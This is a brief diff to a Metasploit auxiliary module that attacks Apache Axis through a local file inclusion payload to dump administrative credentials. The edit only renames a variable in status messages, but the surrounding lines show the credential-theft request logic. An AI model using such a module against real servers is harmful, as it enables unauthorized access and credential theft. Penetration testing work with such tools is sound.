@@ -62,7 +62,7 @@ class Metasploit3 < Msf::Auxiliary
 				get_credentials(new_uri)
 
 			else
-				print_status("#{uri} - Apache Axis - The remote page not accessible")
+				print_status("#{target_url} - Apache Axis - The remote page not accessible")
 				return
 
 			end
@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
 				'uri'     => "#{uri}" + lfi_payload,
 			}, 25)
 
-			print_status("#{uri} - Apache Axis - Dumping administrative credentials")
+			print_status("#{target_url} - Apache Axis - Dumping administrative credentials")
 
 			if (res and res.code == 200)
 				if res.body.to_s.match(/axisconfig/)
